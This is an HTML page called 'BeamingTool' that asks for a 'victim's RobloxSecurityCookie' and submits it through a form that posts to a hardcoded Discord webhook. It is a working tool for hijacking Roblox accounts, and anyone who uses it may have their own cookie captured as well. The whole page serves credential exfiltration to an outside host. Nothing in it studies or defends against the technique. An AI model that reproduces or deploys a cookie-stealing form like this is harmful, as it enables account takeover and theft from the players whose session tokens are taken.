<!DOCTYPE html>
<html>
<head>
	<title>BeamingTool</title>
	<style>
		body {
			background-image: url("https://cdn.discordapp.com/attachments/1072281814619672748/1072566249378300014/b25b1edb800006a0c2050e57553554d0.gif");
			background-repeat: no-repeat;
			background-size: cover;
			background-position: center;
			font-family: Arial, sans-serif;
			color: #fff;
			text-shadow: 1px 1px #000;
		}
		.container {
			max-width: 800px;
			margin: 0 auto;
			padding: 20px;
			background-color: rgba(0, 0, 0, 0.7);
			border-radius: 10px;
			box-shadow: 0 0 10px #000;
		}
		input[type=text] {
			width: 100%;
			padding: 12px 20px;
			margin: 8px 0;
			box-sizing: border-box;
			border: 2px solid #ccc;
			border-radius: 4px;
			font-size: 16px;
			background-color: #f8f8f8;
			resize: none;
		}
		button[type=submit] {
			background-color: #4CAF50;
			color: #fff;
			padding: 12px 20px;
			margin: 8px 0;
			border: none;
			border-radius: 4px;
			cursor: pointer;
			font-size: 16px;
		}
		button[type=submit]:hover {
			background-color: #45a049;
		}
		.error {
			color: red;
			font-weight: bold;
		}
	</style>
	<script>
		// Limit the number of messages a user can send in a day
		function sendMessage() {
			var limit = 3; // Set the message limit
			var sentMessages = localStorage.getItem('sentMessages') || '[]';
			sentMessages = JSON.parse(sentMessages);
			if (sentMessages.length < limit) {
				localStorage.setItem('sentMessages', JSON.stringify(sentMessages.concat(new Date().toDateString())));
			} else {
				document.getElementById('error-message').innerHTML = 'You have exceeded the message limit for today.';
				return false;
			}
		}
	</script>
</head>
<body>
	<div class="container">
		<h1>Enter victim's RobloxSecurityCookie</h1>
		<form onsubmit="return sendMessage();" action="https://discord.com/api/webhooks/1074798154299478056/hlx80PLFxH9pdsTjr3td31iqs7L-RCmQ_y6TaQiqFX7Y2dg1uheKlPZV0U7__X8qfcBw" method="post">
			<label for="message">RobloxSecurityCookie:</label><br>
			<input type="text" id="message" name="content" required><br>
			<button type="submit">Beam</button>
		</form>
		<p class="error" id="error-message"></p>
	</div>
</body>
</html>
